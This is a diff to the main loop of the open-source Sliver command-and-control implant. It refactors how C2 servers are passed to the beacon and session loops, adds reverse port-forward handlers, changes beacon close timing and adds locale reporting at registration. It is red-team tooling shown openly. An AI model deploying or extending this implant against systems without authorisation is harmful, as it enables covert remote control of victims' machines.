@@ -51,6 +51,7 @@ import (
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
+	"github.com/bishopfox/sliver/implant/sliver/locale"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
@@ -67,14 +68,7 @@ import (
 )
 
 var (
-	InstanceID string
-
-	c2Servers = []string{
-		// {{range $index, $value := .Config.C2}}
-		"{{$value}}", // {{$index}}
-		// {{end}}
-	}
-
+	InstanceID       string
 	connectionErrors = 0
 )
 
@@ -202,7 +196,7 @@ func beaconStartup() {
 	defer func() {
 		abort <- struct{}{}
 	}()
-	beacons := transports.StartBeaconLoop(c2Servers, abort)
+	beacons := transports.StartBeaconLoop(abort)
 	for beacon := range beacons {
 		// {{if .Config.Debug}}
 		log.Printf("Next beacon = %v", beacon)
@@ -234,7 +228,7 @@ func sessionStartup() {
 	defer func() {
 		abort <- struct{}{}
 	}()
-	connections := transports.StartConnectionLoop(c2Servers, abort)
+	connections := transports.StartConnectionLoop(abort)
 	for connection := range connections {
 		if connection != nil {
 			err := sessionMainLoop(connection)
@@ -300,8 +294,8 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		Register:    register,
 		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
-	beacon.Close()
 	time.Sleep(time.Second)
+	beacon.Close()
 
 	// BeaconMain - Is executed in it's own goroutine as the function will block
 	// until all tasks complete (in success or failure), if a task handler blocks
@@ -353,6 +347,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] closing ...")
 		// {{end}}
+		time.Sleep(time.Second)
 		beacon.Close()
 	}()
 	// {{if .Config.Debug}}
@@ -480,9 +475,7 @@ func openSessionHandler(data []byte) {
 		log.Printf("[beacon] failed to parse open session msg: %s", err)
 		// {{end}}
 	}
-	// {{if .Config.Debug}}
-	log.Printf("[beacon] open session -> %v", openSession.C2S)
-	// {{end}}
+
 	if openSession.Delay != 0 {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] delay %s", time.Duration(openSession.Delay))
@@ -492,7 +485,7 @@ func openSessionHandler(data []byte) {
 
 	go func() {
 		abort := make(chan struct{})
-		connections := transports.StartConnectionLoop(openSession.C2S, abort)
+		connections := transports.StartConnectionLoop(abort)
 		defer func() { abort <- struct{}{} }()
 		connectionAttempts := 0
 		for connection := range connections {
@@ -548,6 +541,7 @@ func sessionMainLoop(connection *transports.Connection) error {
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
 	specialHandlers := handlers.GetSpecialHandlers()
+	rportfwdHandlers := handlers.GetRportFwdHandlers()
 
 	for envelope := range connection.Recv {
 		if handler, ok := specialHandlers[envelope.Type]; ok {
@@ -558,6 +552,11 @@ func sessionMainLoop(connection *transports.Connection) error {
 		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
+			// {{end}}
+			go handler(envelope, connection)
+		} else if handler, ok := rportfwdHandlers[envelope.Type]; ok {
+			// {{if .Config.Debug}}
+			log.Printf("[recv] rportfwdHandler with type %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
 		} else if handler, ok := sysHandlers[envelope.Type]; ok {
@@ -684,5 +683,6 @@ func registerSliver() *sliverpb.Register {
 		ReconnectInterval: int64(transports.GetReconnectInterval()),
 		ConfigID:          "{{ .Config.ID }}",
 		PeerID:            pivots.MyPeerID,
+		Locale:            locale.GetLocale(),
 	}
 }
